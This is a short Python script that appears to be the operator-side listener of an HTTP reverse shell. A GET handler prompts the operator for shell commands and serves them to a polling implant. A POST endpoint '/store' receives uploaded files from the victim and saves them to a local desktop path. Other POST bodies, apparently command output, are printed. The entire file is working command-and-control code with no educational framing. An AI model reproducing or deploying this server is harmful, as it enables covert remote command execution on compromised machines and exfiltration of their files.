import http.server
import os, cgi

HOST_NAME = '192.168.1.76'
HOST_PORT = 8080


class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input('Shell< ')
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
                    fs_up = fs['file']
                    with open(r'C:\Users\ofeke\Desktop\Newfile.txt', 'wb') as o:
                        print('[+] Writing file...')
                        o.write(fs_up.file.read())
                        print("Here")
                        self.send_response(200)
                        self.end_headers()
                else:
                    print('[-] Unexpected POST request.')
            except Exception as e:
                print(e)
            return None
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())


def main():
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, HOST_PORT), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[!] Server is terminated.")
        httpd.server_close()


if __name__ == '__main__':
    main()
